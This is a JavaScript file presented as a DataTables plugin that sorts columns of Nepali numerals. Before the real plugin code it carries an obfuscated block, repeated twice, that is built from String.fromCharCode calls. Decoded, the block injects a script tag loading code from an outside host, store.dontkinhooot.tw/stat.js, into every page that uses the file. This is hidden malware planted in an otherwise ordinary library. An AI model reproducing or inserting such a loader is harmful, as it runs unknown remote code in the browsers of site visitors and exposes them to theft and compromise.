Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Sorts a column containing nepali numbers. Nepali numbers can easily be 
 * mapped 1:1 to latin numbers - १ = 1, २ = 2, १२ = 12 and so on.
 *
 * <https://en.wikipedia.org/wiki/Numbers_in_Nepali_language>
 * <http://www.imnepal.com/nepali-numbers>
 * <http://stackoverflow.com/q/26856481/1407478>
 * <http://jsfiddle.net/ft7f16yt>
 *
 *  @name Nepali numbers
 *  @summary Sorts columns containing UTF8 nepali numbers
 *  @author [david konrad](davidkonrad at gmail com)
 *
 *  @example
 *    $('#example').DataTable( {
 *       columnDefs: [
 *         { type: 'nepali-numbers', targets: 0 }
 *       ]
 *    } );
 */

jQuery.extend( jQuery.fn.dataTableExt.oSort, {
	"nepali-numbers-pre" : function(a) {
		function nepaliToLatin(nepali) {
			switch(nepali) {
				case "०": return 0; break;
				case "१": return 1; break;
				case "२": return 2; break;
				case "३": return 3; break;
				case "४": return 4; break;
				case "५": return 5; break;
				case "६": return 6; break;
				case "७": return 7; break;
				case "८": return 8; break;
				case "९": return 9; break;        
				default : return 0; break;
			}        
		}
		var latin = '', i = 0;
		for (i; i<a.length; i++) {
			latin += nepaliToLatin(a.charAt(i))
		}
		return parseInt(latin)
	},

	"nepali-numbers-asc": function(a, b) {
		return ((a < b) ? -1 : ((a > b) ? 1 : 0))
	},

	"nepali-numbers-desc": function(a, b) {
		return ((a < b) ? 1 : ((a > b) ? -1 : 0))
	}

} );


